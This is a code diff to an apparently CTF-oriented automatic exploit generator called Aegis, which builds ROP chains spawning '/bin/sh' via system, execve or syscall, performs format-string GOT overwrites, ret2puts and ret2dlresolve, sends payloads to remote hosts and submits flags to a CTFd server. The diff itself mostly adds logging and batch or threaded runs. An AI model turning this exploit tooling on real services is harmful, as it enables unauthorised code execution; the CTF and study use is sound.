@@ -4,7 +4,6 @@ import argparse
 import os
 import json
 import requests
-import ctypes
 
 
 from pwn import *
@@ -20,7 +19,8 @@ class Aegis:
     def __init__(self, binary, libc, ip, port, ctfd, flag_format, id):
     
         self.binary = os.path.abspath(binary)
-        self.elf = ELF(binary)
+        self.binary_name = binary.split("/")[-1]
+        self.elf = ELF(self.binary)
         self.rop = ROP(self.elf)
 
         self.libc = ELF(libc) if libc != None else self.elf.libc
@@ -29,7 +29,7 @@ class Aegis:
         self.port = port
         self.ctfd = ctfd
         self.chal_id = id
-        self.flag_format = flag_format if flag_format is not None else "flag"
+        self.flag_format = flag_format if flag_format is not None else b"flag"
 
         self.access_token = os.environ.get("CTFD_TOK")
         self.headers = {
@@ -68,11 +68,9 @@ class Aegis:
             self.symbol.stack_smash()
             self.symbolic_padding = self.symbol.symbolic_padding
         
-            if not self.has_format:
+            if self.has_format == False:
                 self.has_format = self.symbol.has_format 
 
-            if self.has_format == True:
-                aegis_log.info(f"Found printf format string vulnerability")
 
     def setup_exploit(self):
         
@@ -95,7 +93,7 @@ class Aegis:
 
         # Either Format String Vuln or Array Out of Bounds
         if len(self.against.padding) == 0:
-            aegis_log.warning(f"Could not find buffer overflow")
+            aegis_log.warning(f"[{self.binary_name}] Could not find buffer overflow")
 
             if self.has_format == True:
                 self.against.format_leak("")
@@ -116,28 +114,25 @@ class Aegis:
                             self.against.format_write(win_gadget, got_addr)
                             self.exploit()
                 else:
-                    aegis_log.info(f"Found local flag through stack leak: {self.against.flag}")
-                    self.remote_wait()
+                    aegis_log.info(f"[{self.binary_name}] Found local flag through stack leak: {self.against.flag}")
 
                     self.against.format_leak("REMOTE")
                     if self.against.remote_flag != None:
-                        aegis_log.info(f"Found remote flag through stack leak: {self.against.remote_flag}")
+                        aegis_log.info(f"[{self.binary_name}] Found remote flag through stack leak: {self.against.remote_flag}")
                         self.send_flag(self.against.remote_flag)
-                    self.remote_signal()
             else:
                 if self.got_targets != None:
                     got_addr = self.elf.got[self.got_targets[-1]]
                 else:
                     got_addr = self.elf.got["printf"]
                 if self.array_write != (None, None):
-                    print(self.array_write, got_addr)
                     index = (got_addr - self.array_write[0]) // self.array_write[1]
                     rem = (got_addr - self.array_write[0]) % self.array_write[1] 
 
                     start_addr = self.array_write[0] + index * self.array_write[1]
                     end_addr = start_addr + self.array_write[1]
 
-                    aegis_log.debug(f"Writing to {hex(got_addr)} with index {index} and {rem}\nStart of write {hex(start_addr)}, End of write {hex(end_addr)}")
+                    aegis_log.debug(f"[{self.binary_name}] Writing to {hex(got_addr)} with index {index} and {rem}\nStart of write {hex(start_addr)}, End of write {hex(end_addr)}")
 
                     system_plt = self.elf.plt["system"] + 0x6
                     system_got = self.elf.got["system"]
@@ -172,7 +167,7 @@ class Aegis:
                 func = "win" if function == "win" else win_function
                 goal_addr = self.machine.get_goal_addr(func)
                 params = self.machine.find_path(func, goal_addr)
-                aegis_log.debug(f"Setting up return to win with function with parameters {params}")
+                aegis_log.debug(f"[{self.binary_name}] Setting up return to win with function with parameters {params}")
                 self.against.chain += self.against.rop_chain_call_function(func, params)
                 self.against.exploit = self.against.padding + self.against.chain
 
@@ -180,36 +175,36 @@ class Aegis:
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                     self.against.chain += self.against.rop_chain_call_function(function, [writeable])
-                    aegis_log.debug(f"Setting up return to system with parameters {hex(writeable)}")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to system with parameters {hex(writeable)}")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string])
-                    aegis_log.debug(f"Setting up return to system with parameters {hex(string)}")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to system with parameters {hex(string)}")
                 self.against.exploit = self.against.padding + self.against.chain
             elif function == "execve":
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                     self.against.chain += self.against.rop_chain_call_function(function, [writeable, 0, 0])
-                    aegis_log.debug(f"Setting up return to execve with parameters {hex(writeable)}")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to execve with parameters {hex(writeable)}")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
-                    aegis_log.debug(f"Setting up return to execve with parameters {hex(string)}")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to execve with parameters {hex(string)}")
                 self.against.exploit = self.against.padding + self.against.chain
             elif function == "syscall":
 
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                     self.against.chain += self.against.rop_chain_call_function(function, [59, writeable, 0, 0])
-                    aegis_log.debug(f"Setting up return to syscall with paramters {[59, hex(writeable)]}")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to syscall with paramters {[59, hex(writeable)]}")
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
-                    aegis_log.debug(f"Setting up return to syscall with paramters {[59, hex(string)]}")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to syscall with paramters {[59, hex(string)]}")
                 self.against.exploit = self.against.padding + self.against.chain
             else:
                 if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
-                    aegis_log.debug(f"Setting up return to puts")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to puts")
                     self.against.chain = self.against.rop_ret2puts()
                 elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
-                    aegis_log.debug(f"Setting up return to dlresolve")
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to dlresolve")
                     self.against.chain = self.against.rop_chain_dlresolve()
             self.exploit()
             
@@ -226,9 +221,12 @@ class Aegis:
         data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
         response = requests.post(challenge_url, headers=self.headers, data=data)
         json_data = response.json()
-        #message = json_data["data"]["message"]
+        message = json_data["data"]["message"]
 
-        aegis_log.critical(f"Response from remote server {json_data} for {flag}")
+        if message == "Correct":
+            aegis_log.critical(f"[{self.binary_name}] Got correct flag: {flag}")
+
+
 
 
     def exploit(self):
@@ -238,17 +236,17 @@ class Aegis:
         format_len = len(self.against.format_exploit) if self.against.format_exploit is not None else 0
 
         if chain_len > 0:
-            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+            aegis_log.debug(f"[{self.binary_name}] Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
         else:
             if self.against.format_exploit != None:
-                aegis_log.debug(f"Sending format string payload {self.against.format_exploit} {format_len % 16}")
+                aegis_log.debug(f"[{self.binary_name}] Sending format string payload {self.against.format_exploit} {format_len % 16}")
 
         option = "GDB" if args.GDB else ""
 
         self.against.process = self.against.start(option)
         self.against.send_exploit()
         if self.against.verify_flag() == False:
-            aegis_log.debug(f"Adding ret to chain")
+            aegis_log.debug(f"[{self.binary_name}] Adding ret to chain")
             ret = p64(self.rop.find_gadget(["ret"])[0])
             chain_len = len(self.against.chain)
             self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
@@ -261,7 +259,7 @@ class Aegis:
                 #self.remote_wait()  
                 self.against.process = self.against.start("REMOTE")
                 self.against.send_exploit()                    
-                aegis_log.debug(f"Sent exploit to remote at {self.ip}")
+                aegis_log.debug(f"[{self.binary_name}] Sent exploit to remote at {self.ip}")
                 if self.against.verify_flag() == True:
                     self.send_flag(self.against.flag) 
 
@@ -274,7 +272,7 @@ class Aegis:
                 self.against.send_exploit()
                 if self.against.verify_flag() == True:
                     self.send_flag(self.against.flag) 
-                aegis_log.debug(f"Sent exploit to remote at {self.ip}")
+                aegis_log.debug(f"[{self.binary_name}] Sent exploit to remote at {self.ip}")
                 #self.remote_signal()
 
  
@@ -344,6 +342,7 @@ def print_title():
 
 def exploit_binary(binary, libc, ip, port, ctfd, id):
     aeg = Aegis(binary, libc, ip, port, ctfd, None, id)
+    aeg.static_analysis()
     aeg.symbolic_analysis()
     aeg.setup_exploit()
 
@@ -370,22 +369,40 @@ if __name__ == "__main__":
     parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
     parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)
     parser.add_argument("-id", metavar="challengeid", type=str, help="The ctfd challenge id", default=None)
-    parser.add_argument("-batch", action='store_true', help="Run in batch mode", default=None)
-
+    parser.add_argument("-batch", metavar="batch", type=str, help="Run in batch mode on file with challenges", default=None)
+    parser.add_argument("-thread",action='store_true',help="Run multithreaded")
 
     arguments = parser.parse_args()
     print_title()
 
-    if arguments.batch:
-        challenges = open("challenges.csv", "r").readlines()
-        for chal in challenges:
-            chal = chal.split(" ")
-            service = chal[0]
-            bin = chal[1]
-            id = chal[2]
+    problems = []
+    solved = []
 
-            proc = Process(target=exploit_binary, args=(bin,"./libc/libc.so.6",service,None,"https://ace.ctfd.io",id ))            
-            proc.start()
+    if arguments.batch:
+
+        if os.path.isdir(arguments.batch) == False:
+            challenges = open(arguments.batch, "r").readlines()
+            for chal in challenges:
+                chal = chal.split(" ")
+                service = chal[0]
+                bin = chal[1]
+                id = chal[2]
+            
+                if arguments.thread:
+                    proc = Process(target=exploit_binary, args=(bin,"./libc/libc.so.6",service,None,"https://ace.ctfd.io",id ))            
+                    proc.start()
+                else:
+                    exploit_binary(bin,"./libc/libc.so.6",service,None,"https://ace.ctfd.io",id)
+        else:
+            for chal in os.listdir(arguments.batch):
+                file = arguments.batch + chal
+
+                if arguments.thread:
+                    proc = Process(target=exploit_binary, args=(file,"./libc/libc.so.6",None,None,None,None))            
+                    proc.start()
+                else:
+                    exploit_binary(file,"./libc/libc.so.6",None,None,None,None)
+
 
     else:
         exploit_binary(arguments.bin, arguments.libc, arguments.ip, arguments.port, arguments.ctfd, arguments.id)
